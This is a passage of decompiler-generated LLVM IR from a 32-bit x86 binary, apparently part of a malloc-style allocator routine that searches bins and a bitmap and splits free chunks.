  %v9_804db76 = icmp eq i32 %v3_804db66, 134580756
  %v1_804db7c = icmp eq i1 %v9_804db76, false
  br i1 %v1_804db7c, label %dec_label_pc_804db95, label %dec_label_pc_804db7e

dec_label_pc_804db7e:                             ; preds = %dec_label_pc_804db76
  %v1_804db7e = load i32, i32* @global_var_8058a10.143, align 16
  %v12_804db7e = icmp eq i32 %v0_804dc34111, %v1_804db7e
  %v1_804db84 = icmp eq i1 %v12_804db7e, false
  br i1 %v1_804db84, label %dec_label_pc_804db95, label %dec_label_pc_804db86

dec_label_pc_804db86:                             ; preds = %dec_label_pc_804db7e
  store i32 %v1_804db8a, i32* %eax.global-to-local, align 4
  %v6_804db8f = icmp ugt i32 %v1_804db69, %v1_804db8a
  br i1 %v6_804db8f, label %dec_label_pc_804e146, label %dec_label_pc_804db95

dec_label_pc_804db95:                             ; preds = %dec_label_pc_804db86, %dec_label_pc_804db7e, %dec_label_pc_804db76, %dec_label_pc_804db63
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %eax.global-to-local, align 4
  %v2_804db9a = add i32 %v3_804db66, 8
  %v3_804db9a = inttoptr i32 %v2_804db9a to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v3_804db9a, align 4
  %v0_804db9d = load i32, i32* @edx, align 4
  store i32 %v0_804db9d, i32* @global_var_8058a20.145, align 4
  %v0_804dba0 = load i32, i32* @edi, align 4
  %v15_804dba0 = icmp eq i32 %v0_804dba0, %v1_804de46
  br i1 %v15_804dba0, label %dec_label_pc_804e187, label %dec_label_pc_804dbaa

dec_label_pc_804dbaa:                             ; preds = %dec_label_pc_804db95
  %v6_804dbb0 = icmp ugt i32 %v0_804dba0, 255
  br i1 %v6_804dbb0, label %dec_label_pc_804dbc3, label %dec_label_pc_804dbb2

dec_label_pc_804dbb2:                             ; preds = %dec_label_pc_804dbaa
  %v2_804dbb4 = udiv i32 %v0_804dba0, 8
  store i32 %v2_804dbb4, i32* %esi.global-to-local, align 4
  %v1_804dbb7 = mul nuw i32 %v2_804dbb4, 8
  %v2_804dbb7 = add i32 %v1_804dbb7, 134580748
  store i32 %v2_804dbb7, i32* @ebx, align 4
  %v1_804dbbe = add i32 %v1_804dbb7, 134580756
  %v2_804dbbe = inttoptr i32 %v1_804dbbe to i32*
  %v3_804dbbe = load i32, i32* %v2_804dbbe, align 4
  store i32 %v3_804dbbe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc0c

dec_label_pc_804dbc3:                             ; preds = %dec_label_pc_804dbaa
  store i32 %v0_804dba0, i32* @eax, align 4
  %v0_804dbc5 = call i32 @function_804da2c()
  store i32 %v0_804dbc5, i32* %esi.global-to-local, align 4
  %v1_804dbcc = mul i32 %v0_804dbc5, 8
  %v2_804dbcc = add i32 %v1_804dbcc, ptrtoint (i32* @global_var_8058a0c.142 to i32)
  store i32 %v2_804dbcc, i32* %eax.global-to-local, align 4
  %v1_804dbd3 = add i32 %v1_804dbcc, add (i32 ptrtoint (i32* @global_var_8058a0c.142 to i32), i32 8)
  %v2_804dbd3 = inttoptr i32 %v1_804dbd3 to i32*
  %v3_804dbd3 = load i32, i32* %v2_804dbd3, align 4
  store i32 %v3_804dbd3, i32* %edx.global-to-local, align 4
  store i32 %v3_804dbd3, i32* @ebx, align 4
  %v12_804dbdc = icmp eq i32 %v3_804dbd3, %v2_804dbcc
  br i1 %v12_804dbdc, label %dec_label_pc_804dc0c, label %dec_label_pc_804dbe0

dec_label_pc_804dbe0:                             ; preds = %dec_label_pc_804dbc3
  %v1_804dbe0 = add i32 %v1_804dbcc, add (i32 ptrtoint (i32* @global_var_8058a0c.142 to i32), i32 12)
  %v2_804dbe0 = inttoptr i32 %v1_804dbe0 to i32*
  %v3_804dbe0 = load i32, i32* %v2_804dbe0, align 4
  store i32 %v3_804dbe0, i32* @ebx, align 4
  %v0_804dbe3 = load i32, i32* @edi, align 4
  %v2_804dbe3 = add i32 %v3_804dbe0, 4
  %v3_804dbe3 = inttoptr i32 %v2_804dbe3 to i32*
  %v4_804dbe3 = load i32, i32* %v3_804dbe3, align 4
  %v10_804dbe3 = icmp ult i32 %v0_804dbe3, %v4_804dbe3
  %v1_804dbe6 = icmp eq i1 %v10_804dbe3, false
  br i1 %v1_804dbe6, label %dec_label_pc_804dbee, label %dec_label_pc_804dc0c

dec_label_pc_804dbee:                             ; preds = %dec_label_pc_804dbe0
  %v1_804dbf0 = or i32 %v0_804dbe3, 1
  store i32 %v1_804dbf0, i32* %eax.global-to-local, align 4
  store i32 %v3_804dbd3, i32* %ebx.global-to-local, align 4
  %v2_804dc04101 = add i32 %v3_804dbd3, 4
  %v3_804dc04102 = inttoptr i32 %v2_804dc04101 to i32*
  %v4_804dc04103 = load i32, i32* %v3_804dc04102, align 4
  %v10_804dc04104 = icmp ult i32 %v1_804dbf0, %v4_804dc04103
  br i1 %v10_804dc04104, label %dec_label_pc_804dbf5, label %dec_label_pc_804dc09

dec_label_pc_804dbf5:                             ; preds = %dec_label_pc_804dbee, %dec_label_pc_804dbf5
  %v0_804dc09105 = phi i32 [ %v3_804dbf9, %dec_label_pc_804dbf5 ], [ %v3_804dbd3, %dec_label_pc_804dbee ]
  store i32 %v0_804dc09105, i32* %ecx.global-to-local, align 4
  %v1_804dbf9 = add i32 %v0_804dc09105, 8
  %v2_804dbf9 = inttoptr i32 %v1_804dbf9 to i32*
  %v3_804dbf9 = load i32, i32* %v2_804dbf9, align 4
  store i32 %v3_804dbf9, i32* %ecx.global-to-local, align 4
  store i32 %v3_804dbf9, i32* %ebx.global-to-local, align 4
  %v2_804dc04 = add i32 %v3_804dbf9, 4
  %v3_804dc04 = inttoptr i32 %v2_804dc04 to i32*
  %v4_804dc04 = load i32, i32* %v3_804dc04, align 4
  %v10_804dc04 = icmp ult i32 %v1_804dbf0, %v4_804dc04
  br i1 %v10_804dc04, label %dec_label_pc_804dbf5, label %dec_label_pc_804dc09

dec_label_pc_804dc09:                             ; preds = %dec_label_pc_804dbf5, %dec_label_pc_804dbee
  %v0_804dc09.lcssa = phi i32 [ %v3_804dbd3, %dec_label_pc_804dbee ], [ %v3_804dbf9, %dec_label_pc_804dbf5 ]
  %v1_804dc09 = add i32 %v0_804dc09.lcssa, 12
  %v2_804dc09 = inttoptr i32 %v1_804dc09 to i32*
  %v3_804dc09 = load i32, i32* %v2_804dc09, align 4
  store i32 %v3_804dc09, i32* @ebx, align 4
  br label %dec_label_pc_804dc0c

dec_label_pc_804dc0c:                             ; preds = %dec_label_pc_804dbb2, %dec_label_pc_804dbe0, %dec_label_pc_804dbc3, %dec_label_pc_804dc09
  %v0_804dc0c = phi i32 [ %v0_804dbc5, %dec_label_pc_804dbc3 ], [ %v0_804dbc5, %dec_label_pc_804dc09 ], [ %v0_804dbc5, %dec_label_pc_804dbe0 ], [ %v2_804dbb4, %dec_label_pc_804dbb2 ]
  %stack_var_-64.1 = phi i32 [ %v2_804dbcc, %dec_label_pc_804dbc3 ], [ %v0_804dc09.lcssa, %dec_label_pc_804dc09 ], [ %v2_804dbcc, %dec_label_pc_804dbe0 ], [ %v3_804dbbe, %dec_label_pc_804dbb2 ]
  %v1_804dc0e = urem i32 %v0_804dc0c, 32
  %v2_804dc0e = icmp eq i32 %v1_804dc0e, 0
  store i32 %v1_804dc0e, i32* %esi.global-to-local, align 4
  store i32 %v1_804dc0e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804dc18 = sdiv i32 %v0_804dc0c, 32
  store i32 %v2_804dc18, i32* %edx.global-to-local, align 4
  br i1 %v2_804dc0e, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804dc0c
  %v5_804dc1b = shl i32 1, %v1_804dc0e
  store i32 %v5_804dc1b, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804dc0c, %bb
  %v5_804dc1d = phi i32 [ 1, %dec_label_pc_804dc0c ], [ %v5_804dc1b, %bb ]
  %v1_804dc1d = mul nsw i32 %v2_804dc18, 4
  %v2_804dc1d = add i32 %v1_804dc1d, ptrtoint (i32* @global_var_8058d14.146 to i32)
  %v3_804dc1d = inttoptr i32 %v2_804dc1d to i32*
  %v4_804dc1d = load i32, i32* %v3_804dc1d, align 4
  %v6_804dc1d = or i32 %v4_804dc1d, %v5_804dc1d
  store i32 %v6_804dc1d, i32* %v3_804dc1d, align 4
  %v0_804dc24 = load i32, i32* @ebx, align 4
  %v1_804dc24 = load i32, i32* @ebp, align 4
  %v2_804dc24 = add i32 %v1_804dc24, 12
  %v3_804dc24 = inttoptr i32 %v2_804dc24 to i32*
  store i32 %v0_804dc24, i32* %v3_804dc24, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804dc2b = load i32, i32* @ebp, align 4
  %v2_804dc2b = add i32 %v1_804dc2b, 8
  %v3_804dc2b = inttoptr i32 %v2_804dc2b to i32*
  store i32 %stack_var_-64.1, i32* %v3_804dc2b, align 4
  %v0_804dc2e = load i32, i32* @ebp, align 4
  %v1_804dc2e = load i32, i32* @ebx, align 4
  %v2_804dc2e = add i32 %v1_804dc2e, 8
  %v3_804dc2e = inttoptr i32 %v2_804dc2e to i32*
  store i32 %v0_804dc2e, i32* %v3_804dc2e, align 4
  %v0_804dc31 = load i32, i32* @ebp, align 4
  %v1_804dc31 = load i32, i32* @esi, align 4
  %v2_804dc31 = add i32 %v1_804dc31, 12
  %v3_804dc31 = inttoptr i32 %v2_804dc31 to i32*
  store i32 %v0_804dc31, i32* %v3_804dc31, align 4
  %v0_804dc34 = load i32, i32* @global_var_8058a20.145, align 32
  store i32 %v0_804dc34, i32* @ebp, align 4
  %v9_804dc3a = icmp eq i32 %v0_804dc34, 134580756
  %v1_804dc40 = icmp eq i1 %v9_804dc3a, false
  br i1 %v1_804dc40, label %dec_label_pc_804db63, label %dec_label_pc_804dc46

dec_label_pc_804dc46:                             ; preds = %bb84, %dec_label_pc_804dc34.preheader
  br i1 %v8_804daf7, label %dec_label_pc_804dcd4, label %dec_label_pc_804dc54

dec_label_pc_804dc54:                             ; preds = %dec_label_pc_804dc46
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804dc58 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804dc58 = add i32 %v1_804dc58, ptrtoint (i32* @global_var_8058a0c.142 to i32)
  store i32 %v2_804dc58, i32* %edx.global-to-local, align 4
  %v1_804dc5f = add i32 %v1_804dc58, add (i32 ptrtoint (i32* @global_var_8058a0c.142 to i32), i32 12)
  %v2_804dc5f = inttoptr i32 %v1_804dc5f to i32*
  %storemerge1.pre = load i32, i32* %v2_804dc5f, align 4
  br label %dec_label_pc_804dcd0

dec_label_pc_804dc64:                             ; preds = %dec_label_pc_804dcd0
  %v1_804dc64 = add i32 %v4_804dc7b, 4
  %v2_804dc64 = inttoptr i32 %v1_804dc64 to i32*
  %v3_804dc64 = load i32, i32* %v2_804dc64, align 4
  store i32 %v3_804dc64, i32* %ebx.global-to-local, align 4
  %v1_804dc67 = add i32 %v4_804dc7b, 12
  %v2_804dc67 = inttoptr i32 %v1_804dc67 to i32*
  %v3_804dc67 = load i32, i32* %v2_804dc67, align 4
  store i32 %v3_804dc67, i32* @ecx, align 4
  %v1_804dc6a = and i32 %v3_804dc64, -4
  store i32 %v1_804dc6a, i32* @ebx, align 4
  %v10_804dc6d = icmp ult i32 %v1_804dc6a, %v1_804de46
  br i1 %v10_804dc6d, label %dec_label_pc_804dcd0, label %dec_label_pc_804dc73

dec_label_pc_804dc73:                             ; preds = %dec_label_pc_804dc64
  %v1_804dc73 = add i32 %v4_804dc7b, 8
  %v2_804dc73 = inttoptr i32 %v1_804dc73 to i32*
  %v3_804dc73 = load i32, i32* %v2_804dc73, align 4
  store i32 %v3_804dc73, i32* @edx, align 4
  %v1_804dc76 = add i32 %v3_804dc73, 12
  %v2_804dc76 = inttoptr i32 %v1_804dc76 to i32*
  %v3_804dc76 = load i32, i32* %v2_804dc76, align 4
  %v15_804dc76 = icmp eq i32 %v3_804dc76, %v4_804dc7b
  %v1_804dc79 = icmp eq i1 %v15_804dc76, false
  br i1 %v1_804dc79, label %dec_label_pc_804dc80, label %dec_label_pc_804dc7b

dec_label_pc_804dc7b:                             ; preds = %dec_label_pc_804dc73
  %v1_804dc7b = add i32 %v3_804dc67, 8
  %v2_804dc7b = inttoptr i32 %v1_804dc7b to i32*
  %v3_804dc7b = load i32, i32* %v2_804dc7b, align 4
  %v15_804dc7b = icmp eq i32 %v3_804dc7b, %v4_804dc7b
  br i1 %v15_804dc7b, label %dec_label_pc_804dc85, label %dec_label_pc_804dc80

dec_label_pc_804dc80:                             ; preds = %dec_label_pc_804dc7b, %dec_label_pc_804dc73
  %v0_804dc80 = call i32 @function_804e8e4()
  store i32 %v0_804dc80, i32* %eax.global-to-local, align 4
  %v0_804dc85.pre = load i32, i32* @ebx, align 4
  %v0_804dc8b.pre = load i32, i32* @ecx, align 4
  %v1_804dc8b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804dc85

dec_label_pc_804dc85:                             ; preds = %dec_label_pc_804dc7b, %dec_label_pc_804dc80
  %v1_804dc8b = phi i32 [ %v3_804dc73, %dec_label_pc_804dc7b ], [ %v1_804dc8b.pre, %dec_label_pc_804dc80 ]
  %v0_804dc8b = phi i32 [ %v3_804dc67, %dec_label_pc_804dc7b ], [ %v0_804dc8b.pre, %dec_label_pc_804dc80 ]
  %v0_804dc85 = phi i32 [ %v1_804dc6a, %dec_label_pc_804dc7b ], [ %v0_804dc85.pre, %dec_label_pc_804dc80 ]
  %v5_804dc87 = sub i32 %v0_804dc85, %v1_804de46
  store i32 %v5_804dc87, i32* %esi.global-to-local, align 4
  %v2_804dc8b = add i32 %v1_804dc8b, 12
  %v3_804dc8b = inttoptr i32 %v2_804dc8b to i32*
  store i32 %v0_804dc8b, i32* %v3_804dc8b, align 4
  %v0_804dc8e = load i32, i32* @edx, align 4
  %v1_804dc8e = load i32, i32* @ecx, align 4
  %v2_804dc8e = add i32 %v1_804dc8e, 8
  %v3_804dc8e = inttoptr i32 %v2_804dc8e to i32*
  store i32 %v0_804dc8e, i32* %v3_804dc8e, align 4
  %v0_804dc91 = load i32, i32* %esi.global-to-local, align 4
  %v0_804dc94 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc94 = add i32 %v0_804dc94, 8
  store i32 %v1_804dc94, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804dc91, 16
  br i1 %tmp127, label %dec_label_pc_804e195, label %dec_label_pc_804dc9d

dec_label_pc_804dc9d:                             ; preds = %dec_label_pc_804dc85
  %v2_804dca1 = add i32 %v0_804dc94, %v1_804de46
  store i32 %v2_804dca1, i32* @edx, align 4
  %v1_804dca4 = or i32 %v1_804de46, 1
  store i32 %v1_804dca4, i32* %ebx.global-to-local, align 4
  %v2_804dca7 = add i32 %v0_804dc94, 4
  %v3_804dca7 = inttoptr i32 %v2_804dca7 to i32*
  store i32 %v1_804dca4, i32* %v3_804dca7, align 4
  %v0_804dcaa = load i32, i32* %esi.global-to-local, align 4
  %v1_804dcac = or i32 %v0_804dcaa, 1
  store i32 %v1_804dcac, i32* %eax.global-to-local, align 4
  %v0_804dcaf = load i32, i32* @edx, align 4
  %v1_804dcaf = load i32, i32* @ebp, align 4
  %v2_804dcaf = add i32 %v1_804dcaf, 8
  %v3_804dcaf = inttoptr i32 %v2_804dcaf to i32*
  store i32 %v0_804dcaf, i32* %v3_804dcaf, align 4
  %v0_804dcb2 = load i32, i32* @edx, align 4
  %v1_804dcb2 = load i32, i32* @ebp, align 4
  %v2_804dcb2 = add i32 %v1_804dcb2, 12
  %v3_804dcb2 = inttoptr i32 %v2_804dcb2 to i32*
  store i32 %v0_804dcb2, i32* %v3_804dcb2, align 4
  %v0_804dcb5 = load i32, i32* @edx, align 4
  %v1_804dcb5 = add i32 %v0_804dcb5, 8
  %v2_804dcb5 = inttoptr i32 %v1_804dcb5 to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804dcb5, align 4
  %v0_804dcbc = load i32, i32* @edx, align 4
  %v1_804dcbc = add i32 %v0_804dcbc, 12
  %v2_804dcbc = inttoptr i32 %v1_804dcbc to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804dcbc, align 4
  %v0_804dcc3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dcc3 = load i32, i32* @edx, align 4
  %v2_804dcc3 = add i32 %v1_804dcc3, 4
  %v3_804dcc3 = inttoptr i32 %v2_804dcc3 to i32*
  store i32 %v0_804dcc3, i32* %v3_804dcc3, align 4
  %v0_804dcc6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dcc6 = load i32, i32* @edx, align 4
  %v3_804dcc6 = add i32 %v1_804dcc6, %v0_804dcc6
  %v4_804dcc6 = inttoptr i32 %v3_804dcc6 to i32*
  store i32 %v0_804dcc6, i32* %v4_804dcc6, align 4
  br label %dec_label_pc_804e19a

dec_label_pc_804dcd0:                             ; preds = %dec_label_pc_804dc64, %dec_label_pc_804dc54
  %v4_804dc7b = phi i32 [ %storemerge1.pre, %dec_label_pc_804dc54 ], [ %v3_804dc67, %dec_label_pc_804dc64 ]
  store i32 %v4_804dc7b, i32* %eax.global-to-local, align 4
  %v12_804dcd0 = icmp eq i32 %v4_804dc7b, %v2_804dc58
  %v1_804dcd2 = icmp eq i1 %v12_804dcd0, false
  br i1 %v1_804dcd2, label %dec_label_pc_804dc64, label %dec_label_pc_804dcd4.loopexit

dec_label_pc_804dcd4.loopexit:                    ; preds = %dec_label_pc_804dcd0
  br label %dec_label_pc_804dcd4

dec_label_pc_804dcd4:                             ; preds = %dec_label_pc_804dcd4.loopexit, %dec_label_pc_804dc46
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804dcdd = add i32 %stack_var_-40.0.ph, 1
  %v2_804dce0 = udiv i32 %v1_804dcdd, 32
  store i32 %v2_804dce0, i32* @edi, align 4
  %v1_804dce3 = mul i32 %v1_804dcdd, 8
  %v2_804dce3 = add i32 %v1_804dce3, ptrtoint (i32* @global_var_8058a0c.142 to i32)
  store i32 %v2_804dce3, i32* %ebx.global-to-local, align 4
  %v1_804dcea = urem i32 %v1_804dcdd, 32
  %v2_804dcea = icmp eq i32 %v1_804dcea, 0
  store i32 %v1_804dcea, i32* %ecx.global-to-local, align 4
  %v1_804dced = mul nuw nsw i32 %v2_804dce0, 4
  %v2_804dced = add i32 %v1_804dced, ptrtoint (i32* @global_var_8058d14.146 to i32)
  %v3_804dced = inttoptr i32 %v2_804dced to i32*
  %v4_804dced = load i32, i32* %v3_804dced, align 4
  store i32 %v4_804dced, i32* %edx.global-to-local, align 4
  br i1 %v2_804dcea, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804dcd4
  %v5_804dcf4 = shl i32 1, %v1_804dcea
  store i32 %v5_804dcf4, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804dcd4, %bb85, %dec_label_pc_804dd35
  %v1_804dcf6 = phi i32 [ %v1_804dcf6.pre, %dec_label_pc_804dd35 ], [ %v4_804dced, %bb85 ], [ %v4_804dced, %dec_label_pc_804dcd4 ]
  %v0_804dcfa = phi i32 [ %v0_804dcf6.pre, %dec_label_pc_804dd35 ], [ %v5_804dcf4, %bb85 ], [ 1, %dec_label_pc_804dcd4 ]
  %tmp86 = icmp ule i32 %v0_804dcfa, %v1_804dcf6
  %v1_804dcfa = icmp eq i32 %v0_804dcfa, 0
  %v1_804dcfc = icmp eq i1 %v1_804dcfa, false
  %or.cond = and i1 %tmp86, %v1_804dcfc
  br i1 %or.cond, label %dec_label_pc_804dcfa.dec_label_pc_804dd2a.preheader_crit_edge, label %dec_label_pc_804dcfe.preheader

dec_label_pc_804dcfa.dec_label_pc_804dd2a.preheader_crit_edge: ; preds = %.preheader
  %v0_804dd2512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd2a.preheader

dec_label_pc_804dcfe.preheader:                   ; preds = %.preheader
  %v0_804dcfe.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dcfe

dec_label_pc_804dcfe:                             ; preds = %dec_label_pc_804dcfe.preheader, %dec_label_pc_804dd08
  %v0_804dcfe = phi i32 [ %v0_804dcfe.pre, %dec_label_pc_804dcfe.preheader ], [ %v1_804dcfe, %dec_label_pc_804dd08 ]
  %v1_804dcfe = add i32 %v0_804dcfe, 1
  store i32 %v1_804dcfe, i32* @edi, align 4
  %v6_804dd02 = icmp ugt i32 %v1_804dcfe, 2
  br i1 %v6_804dd02, label %dec_label_pc_804ddb1.loopexit, label %dec_label_pc_804dd08

dec_label_pc_804dd08:                             ; preds = %dec_label_pc_804dcfe
  %v1_804dd08 = mul i32 %v1_804dcfe, 4
  %v2_804dd08 = add i32 %v1_804dd08, ptrtoint (i32* @global_var_8058d14.146 to i32)
  %v3_804dd08 = inttoptr i32 %v2_804dd08 to i32*
  %v4_804dd08 = load i32, i32* %v3_804dd08, align 4
  store i32 %v4_804dd08, i32* %edx.global-to-local, align 4
  %v1_804dd0f = icmp eq i32 %v4_804dd08, 0
  br i1 %v1_804dd0f, label %dec_label_pc_804dcfe, label %dec_label_pc_804dd13

dec_label_pc_804dd13:                             ; preds = %dec_label_pc_804dd08
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804dd1a = mul i32 %v1_804dcfe, 256
  store i32 %v2_804dd1a, i32* %eax.global-to-local, align 4
  %v1_804dd1d = add i32 %v2_804dd1a, ptrtoint (i32* @global_var_8058a0c.142 to i32)
  store i32 %v1_804dd1d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd2a.preheader

dec_label_pc_804dd2a.preheader:                   ; preds = %dec_label_pc_804dcfa.dec_label_pc_804dd2a.preheader_crit_edge, %dec_label_pc_804dd13
  %v0_804dd2512 = phi i32 [ %v1_804dd1d, %dec_label_pc_804dd13 ], [ %v0_804dd2512.pre, %dec_label_pc_804dcfa.dec_label_pc_804dd2a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804dd13 ], [ %v0_804dcfa, %dec_label_pc_804dcfa.dec_label_pc_804dd2a.preheader_crit_edge ]
  %v0_804dd3c = phi i32 [ %v4_804dd08, %dec_label_pc_804dd13 ], [ %v1_804dcf6, %dec_label_pc_804dcfa.dec_label_pc_804dd2a.preheader_crit_edge ]
  %v2_804dd2a4 = and i32 %v0_804dd3c, %esi.promoted
  %v3_804dd2a5 = icmp eq i32 %v2_804dd2a4, 0
  br i1 %v3_804dd2a5, label %dec_label_pc_804dd25, label %dec_label_pc_804dd2e

dec_label_pc_804dd25:                             ; preds = %dec_label_pc_804dd2a.preheader, %dec_label_pc_804dd25
  %v2_804dd2814 = phi i32 [ %v2_804dd28, %dec_label_pc_804dd25 ], [ %esi.promoted, %dec_label_pc_804dd2a.preheader ]
  %v0_804dd2513 = phi i32 [ %v1_804dd25, %dec_label_pc_804dd25 ], [ %v0_804dd2512, %dec_label_pc_804dd2a.preheader ]
  %v1_804dd25 = add i32 %v0_804dd2513, 8
  %v2_804dd28 = mul i32 %v2_804dd2814, 2
  %v2_804dd2a = and i32 %v2_804dd28, %v0_804dd3c
  %v3_804dd2a = icmp eq i32 %v2_804dd2a, 0
  br i1 %v3_804dd2a, label %dec_label_pc_804dd25, label %dec_label_pc_804dd2a.dec_label_pc_804dd2e_crit_edge

dec_label_pc_804dd2a.dec_label_pc_804dd2e_crit_edge: ; preds = %dec_label_pc_804dd25
  store i32 %v1_804dd25, i32* %ebx.global-to-local, align 4
  store i32 %v2_804dd28, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dd2e

dec_label_pc_804dd2e:                             ; preds = %dec_label_pc_804dd2a.dec_label_pc_804dd2e_crit_edge, %dec_label_pc_804dd2a.preheader
  %v0_804dd3e = phi i32 [ %v2_804dd28, %dec_label_pc_804dd2a.dec_label_pc_804dd2e_crit_edge ], [ %esi.promoted, %dec_label_pc_804dd2a.preheader ]
  %v1_804dd58 = phi i32 [ %v1_804dd25, %dec_label_pc_804dd2a.dec_label_pc_804dd2e_crit_edge ], [ %v0_804dd2512, %dec_label_pc_804dd2a.preheader ]
  %v1_804dd2e = add i32 %v1_804dd58, 12
  %v2_804dd2e = inttoptr i32 %v1_804dd2e to i32*
  %v3_804dd2e = load i32, i32* %v2_804dd2e, align 4
  store i32 %v3_804dd2e, i32* @ecx, align 4
  %v12_804dd31 = icmp eq i32 %v3_804dd2e, %v1_804dd58
  %v1_804dd33 = icmp eq i1 %v12_804dd31, false
  br i1 %v1_804dd33, label %dec_label_pc_804dd49, label %dec_label_pc_804dd35

dec_label_pc_804dd35:                             ; preds = %dec_label_pc_804dd2e
  %v1_804dd37 = add i32 %v3_804dd2e, 8
  store i32 %v1_804dd37, i32* %ebx.global-to-local, align 4
  %v1_804dd3a = sub i32 -1, %v0_804dd3e
  store i32 %v1_804dd3a, i32* %eax.global-to-local, align 4
  %v2_804dd3c = and i32 %v0_804dd3c, %v1_804dd3a
  store i32 %v2_804dd3c, i32* %edx.global-to-local, align 4
  %v2_804dd3e = mul i32 %v0_804dd3e, 2
  store i32 %v2_804dd3e, i32* %esi.global-to-local, align 4
  %v1_804dd40 = load i32, i32* @edi, align 4
  %v2_804dd40 = mul i32 %v1_804dd40, 4
  %v3_804dd40 = add i32 %v2_804dd40, ptrtoint (i32* @global_var_8058d14.146 to i32)
  %v4_804dd40 = inttoptr i32 %v3_804dd40 to i32*
  store i32 %v2_804dd3c, i32* %v4_804dd40, align 4
  %v0_804dcf6.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804dcf6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804dd49:                             ; preds = %dec_label_pc_804dd2e
  %v1_804dd49 = add i32 %v3_804dd2e, 4
  %v2_804dd49 = inttoptr i32 %v1_804dd49 to i32*
  %v3_804dd49 = load i32, i32* %v2_804dd49, align 4
  store i32 %v3_804dd49, i32* %edx.global-to-local, align 4
  %v1_804dd4c = add i32 %v3_804dd2e, 12
  %v2_804dd4c = inttoptr i32 %v1_804dd4c to i32*
  %v3_804dd4c = load i32, i32* %v2_804dd4c, align 4
  store i32 %v3_804dd4c, i32* %eax.global-to-local, align 4
  %v1_804dd4f = and i32 %v3_804dd49, -4
  store i32 %v1_804dd4f, i32* @edx, align 4
  %v5_804dd54 = sub i32 %v1_804dd4f, %v1_804de46
  store i32 %v5_804dd54, i32* %esi.global-to-local, align 4
  store i32 %v3_804dd4c, i32* %v2_804dd2e, align 4
  %v0_804dd5b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd5b = load i32, i32* %eax.global-to-local, align 4
  %v2_804dd5b = add i32 %v1_804dd5b, 8
  %v3_804dd5b = inttoptr i32 %v2_804dd5b to i32*
  store i32 %v0_804dd5b, i32* %v3_804dd5b, align 4
  %v0_804dd5e = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804dd5e, 16
  br i1 %tmp128, label %dec_label_pc_804dd63, label %dec_label_pc_804dd6a

dec_label_pc_804dd63:                             ; preds = %dec_label_pc_804dd49
  %v0_804dd63 = load i32, i32* @ecx, align 4
  %v1_804dd63 = load i32, i32* @edx, align 4
  %v2_804dd63 = add i32 %v0_804dd63, 4
  %v3_804dd63 = add i32 %v2_804dd63, %v1_804dd63
  %v4_804dd63 = inttoptr i32 %v3_804dd63 to i32*
  %v5_804dd63 = load i32, i32* %v4_804dd63, align 4
  %v6_804dd63 = or i32 %v5_804dd63, 1
  store i32 %v6_804dd63, i32* %v4_804dd63, align 4
  br label %dec_label_pc_804dda9

dec_label_pc_804dd6a:                             ; preds = %dec_label_pc_804dd49
  store i32 %v1_804de46, i32* %eax.global-to-local, align 4
  %v0_804dd73 = load i32, i32* @ecx, align 4
  %v2_804dd73 = add i32 %v0_804dd73, %v1_804de46
  store i32 %v2_804dd73, i32* @edx, align 4
  %v1_804dd76 = load i32, i32* @ebp, align 4
  %v2_804dd76 = add i32 %v1_804dd76, 8
  %v3_804dd76 = inttoptr i32 %v2_804dd76 to i32*
  store i32 %v2_804dd73, i32* %v3_804dd76, align 4
  %v0_804dd79 = load i32, i32* @edx, align 4
  %v1_804dd79 = load i32, i32* @ebp, align 4
  %v2_804dd79 = add i32 %v1_804dd79, 12
  %v3_804dd79 = inttoptr i32 %v2_804dd79 to i32*
  store i32 %v0_804dd79, i32* %v3_804dd79, align 4
  %v0_804dd7c = load i32, i32* @edx, align 4
  %v1_804dd7c = add i32 %v0_804dd7c, 8
  %v2_804dd7c = inttoptr i32 %v1_804dd7c to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804dd7c, align 4
  %v0_804dd83 = load i32, i32* @edx, align 4
  %v1_804dd83 = add i32 %v0_804dd83, 12
  %v2_804dd83 = inttoptr i32 %v1_804dd83 to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804dd83, align 4
  br i1 %v6_804daff, label %dec_label_pc_804dd92, label %dec_label_pc_804dd8c

dec_label_pc_804dd8c:                             ; preds = %dec_label_pc_804dd6a
  %v0_804dd8c = load i32, i32* @edx, align 4
  store i32 %v0_804dd8c, i32* @global_var_8058a10.143, align 16
  br label %dec_label_pc_804dd92

dec_label_pc_804dd92:                             ; preds = %dec_label_pc_804dd6a, %dec_label_pc_804dd8c
  %v4_804dd92 = or i32 %v1_804de46, 1
  %v0_804dd97 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804dd92, i32* %ebx.global-to-local, align 4
